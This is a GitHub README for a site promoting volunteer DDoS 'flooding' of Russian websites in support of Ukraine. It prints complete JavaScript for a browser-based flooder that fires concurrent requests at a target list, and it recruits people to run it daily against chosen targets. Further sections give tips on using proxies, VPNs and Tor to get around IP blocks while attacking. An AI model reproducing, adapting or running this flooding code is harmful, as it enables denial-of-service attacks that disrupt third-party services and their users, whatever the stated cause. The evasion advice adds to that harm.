# HelpUKR-HOSTED
#### This is the Hosted Repo for the site "helpukr.xyz" www.helpukr.xyz
HelpUKR offers lots of ways to help supporting Ukraine, from simply using your computer to donating to charities.
We offer the best JavaScript based website flooding tool for efficiently participating in flooding Russian propaganda outlets and infrastructure that is aiding Putin's war. We're always up-to-date with daily targets chosen by the IT Army of Ukraine and have great success rates. We're doing this because of people being murdered, tortured and raped every day, cities being destroyed randomly, the 15000+ war crimes that happened since the war has started. There will be a new page every day until this war ends and Putin is removed from power.
We offer you flooding tools for browsers and a huge archive of information on related subjects.

## Screenshot:
![Screenshot](https://i.imgur.com/toklkAG.jpg)

## Flood Russian Propaganda Infrastructure:
Every day the IT Army of Ukraine releases a new list of targets to flood for that day, targets are selected carefully by an intelligence team that looks into what's happening – who is spreading the propaganda, which services are aiding the war, etc.
This tool is being updated daily using that list and it provides an easy to run solution for flooding Russian propaganda outlets via any device with a browser able to connect to the internet.
You can walk around town shopping while flooding Russian propaganda outlets from a phone in your pocket. It can even be used via the browser app on a Smart TV in the background whilst you watch TV.
This can help convincing Russians to rebel against the war by making them look elsewhere for news. 
Remember, nothing you do is too little!

### How It Works
It's simple JavaScript script that requests all the data from each target website as if you were visiting it, requests are made in full via GET which means data used by your device is much less compared to the data being requested from the servers.
Targets are loaded in a random sequence each time the page is loaded, then requests are made recursively in the order it loaded. You can see this in the network tab of your browser's Developer Console. (Example below)
![Screenshot](https://i.imgur.com/nA9zXoF.gif)

### JavaScript
Below is an example of a JavaScript script used to power the flooding tool, arranging the targets and displaying a warning before it starts. It's simple, effective and can be embedded and styled within a single HTML page.

```target list
 // target list
        var urls = [
            'http://example.ru/',
            'https://0.0.0.0:443/',
            'http://0.0.0.0:80/',
        ];

        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;

        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "Resume";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "Pause";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         

        async function flood(n) {
            const url = urls[n];
            const target = targets[url];

            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );

                await sleep(1);
            }
        }

        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }

        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }

        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                    <h4>${urls[i]}</h4>
                    <table class='status'>
                        <tr><td>requests:</td><td class="requests">0</td></tr>
                        </tr><td>errors:</td><td class="errors">0</td></tr>
                    </table>
                </div>
            `;
        }

        // Show warning window
        myModal.toggle();

    
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-85513613-1');
```

## DDoS Help
If you're on a device with more control over like a PC, you can use much more advanced DDoS techniques. This allows you to have your computer generate complex payloads of data, abstract queries and all kinds of other server abusing craziness.
In this section we’ll detail all kinds of useful software that can be used to attack our targets from.  
https://www.helpukr.xyz/ddos-help.htm
## IT Army
The IT Army of Ukraine is made up of volunteers around the world, it was announced during the first days of Russia’s invasion and backed by the Ukrainian government. Since then millions of people from around the world have joined to help in tipping the balance of Russia’s war.
The main goal of this group is to flood Russian propaganda outlets and make the sites spreading lies to the Russian people unable to function, forcing the Russian people to look elsewhere for their news. You can help with disrupting Russian infrastructure that is helping with their invasion, and cause as many technical problems as possible for them. Every day a new list of targets is released that every member in the group can flood by their desired method.  
https://www.helpukr.xyz/it-army.htm
## Donate to Ukraine
Ukraine is fighting a Russian-led invasion, defending its territories against ongoing missile attacks. This aggression has been hurting families, destroying homes and lives of millions of Ukrainians. There is innocent blood on Russia’s hands.
Now is the time for the whole world to unite and fight together towards peace and democracy around the world, rejecting Putin’s one-party system led by a dictator.
People from saveukraine.org have compiled a list of credible volunteer organizations which are working day and night to provide life-saving care. Your donations for Ukraine are crucial for supporting Ukraine’s Armed Forces and civilians displaced during the war.  
https://www.helpukr.xyz/donate-to-ukraine.htm
## News
Here we list articles of credible news for Putin’s invasion of Ukraine, The news is powered by an RSS run by BigEarthData, a service that allows you to take a search term and turn it into a timeline of related news. All news provided via this RSS feed is thoroughly gone over by professional journalists in the origin group, sourced from lots of different legitimate and trusted news providers from around the world. This list is updated more or less every 10 minutes and is a great source for Russian citizens to see what’s really happening.  
http://www.helpukr.xyz/news.htm
## VPN
VPN is short for Virtual Private Network, it’s one of the most efficient and secure ways to keep yourself anonymous online. They work by routing your entire computers network through there servers. There are a lot of good VPN providers out there to explore but some can be dangerous, and others are often snooped on, VPNs listed below fall outside the 14 Eyes alliance and ensure complete security.  
https://www.helpukr.xyz/vpns.htm
## Proxies
Proxy servers are one of the simplest methods of routing through another location. Proxying was the first method that came about that allowed people to route their browsing data through another connection elsewhere in the world, they act as a relay passing data you request along from another machine (the proxy server) and then relay that data back to you, proxy servers usually work in the browser and allow you to simply enter a web address to visit sites via the proxy servers. It's not as secure as VPNs and ToR but it is useful for flooding sites with when your IPs have been blocked. Proxy servers are rarely managed by a company, a lot of the time it's random people who set them up at home as part of some random project and so some of them won't be online for huge periods of time after they appear; for this reason we'll embed proxy servers from a live list of servers that’s regularly updated. 
https://www.helpukr.xyz/proxies.htm
## Tor
The Tor Browser uses Onion routing which routes your connection through multiple layers of Tor nodes before any data is processed. It was originally created by a group of military scientists and since then has evolved into an open source deep network also known as Darknet. Those sites use the .onion extension which can only be resolved by Onion routing – which is why Tor is a grey area for most countries; but for secure browsing it's probably the best choice. The Tor browser will make it easy for you to get a new IP address whenever you need one – simply by clicking the new ID button at the top right of the address bar. If you cycle through Tor nodes long enough you can come across some good Russian connections to utilise.  
https://www.helpukr.xyz/tor.htm
